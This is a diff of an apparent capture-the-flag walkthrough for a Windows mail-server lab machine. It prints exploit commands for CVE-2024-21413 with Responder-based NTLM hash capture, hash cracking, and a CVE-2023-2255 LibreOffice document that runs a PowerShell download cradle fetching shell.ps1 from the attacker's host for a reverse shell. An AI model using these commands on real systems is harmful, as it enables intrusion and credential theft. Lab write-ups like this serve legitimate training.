@@ -173,6 +173,7 @@ Database=hMailServer
 Internal=1
 ````
 AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7 this is encrypted as MD5 
+
 <img width="872" height="57" alt="image" src="https://github.com/user-attachments/assets/1a0042b9-be95-422d-a102-d3006b1a9dd6" />
 
 Pass this to a hash.txt file:
@@ -194,10 +195,13 @@ Session completed.
 The Administrator password is: homenetworkingadministrator
 
 The Windows server is running a mail server, as we saw from the instructions.pdf file it is using the default Windows Mail client to connect to the mail server
+
 <img width="752" height="191" alt="image" src="https://github.com/user-attachments/assets/81673b6d-4918-4b0d-b5f1-ce570e393af2" />
 
 Searching online for CVE for Windows Mail, I found CVE-2024-21413 alongside a PoC in GitHub https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/blob/main/README.md. To use this PoC we also need someone to recieve the email we are going to send. Going back to the website we can see some employee names listed over there:
+
 <img width="813" height="387" alt="image" src="https://github.com/user-attachments/assets/acbed4ca-1147-4f87-8fd5-4fc7460eb440" />
+
 Let's try targeting Maya from support. First set up responder to listen to our vpn(tun0) so we can capture the NTLM key:
 ```bash
 sudo responder -I tun0
@@ -213,9 +217,11 @@ After that is done, execute the PoC:
 python CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\<your-ip>\test\meeting" --subject test
 ```
 After a minute or so, responder should have the ntlmv2 hash:
+
 <img width="1893" height="243" alt="image" src="https://github.com/user-attachments/assets/605dbfc6-c4cc-4033-af04-9d0dbbfdc3c0" />
 
 Save it to a file and crack it with john:
+
 <img width="1105" height="181" alt="image" src="https://github.com/user-attachments/assets/7bbeb667-2430-4e63-ba30-4766a7c01063" />
 
 The cracked password is: m4y4ngs4ri for the maya user.
@@ -229,6 +235,7 @@ Ok, Important Documents seems, well, pretty important. Let's check it out:
 ```bash
 ```
 There is nothing there, let's try it over at evil-winrm, and it works:
+
 <img width="1912" height="237" alt="image" src="https://github.com/user-attachments/assets/863e20eb-3a3c-465d-8e8c-20479c45aef0" />
 
 PRIVESC
@@ -272,13 +279,16 @@ Now we'll see who runs this task:
 (Get-ScheduledTask -TaskName "Test").Principal | Format-List * 
 ```
 It's localadmin:
+
 <img width="1917" height="280" alt="image" src="https://github.com/user-attachments/assets/a86f7418-3398-49de-9e9c-0c68d58e14b7" />
 
 Let's see what this soffice.ps1 is about:
+
 <img width="1917" height="428" alt="image" src="https://github.com/user-attachments/assets/7e65cbab-af47-4b2d-bbc4-0602b6021688" />
 
 This is very usefull now. Basically the script checks all .odt files inside \Important Documents and executes them. This could be something.
 We can see that LibreOffice is installed, the .ini file is located inside the programs directory:
+
 <img width="1917" height="252" alt="image" src="https://github.com/user-attachments/assets/20f55c6a-7dbb-4b36-9dee-32528c73692d" />
 
 Version for LibreOffice is 7.4.0.1 if we look online we'll find the following CVE: CVE-2023-2255. Basically this creates a malicious file that will execute a command of our choosing. The plan now is to use the PoC to craft a malicious .odt file that forces the machine to execute a reverse shell back to us. First we clone the repository:
@@ -291,6 +301,7 @@ echo IEX(New-Object Net.WebClient).downloadString('http://<your-ip>:8000/shell.p
 cat cradle | iconv -t utf-16le | base64 -w 0
 ```
 This should output a base64 code:
+
 <img width="1912" height="83" alt="image" src="https://github.com/user-attachments/assets/cf6620ad-98c4-4c3a-9c83-1cba2fe46bb1" />
 
 Next, copy and execute this command:
@@ -322,9 +333,11 @@ cd \"Important Documents"
 curl http://<tun0-ip>:8000/exploit.odt -o exploit.odt
 ```
 If everythin goes well, you should see the exploit.odt being downloaded. Then shortly after shell.ps1:
+
 <img width="1917" height="90" alt="image" src="https://github.com/user-attachments/assets/b97406b8-5ab6-4cc7-b197-055b9348739e" />
 
 When that happens nc should capture a reverse shell:
+
 <img width="1917" height="667" alt="image" src="https://github.com/user-attachments/assets/8d57ceb9-68a2-4546-9d9d-2206e8fa213a" />
 
 All of this only worked because there was a sheduled task being executed by localadmin, also there was a version of LibreOffice not patched installed in the system being ran by said scheduled task.
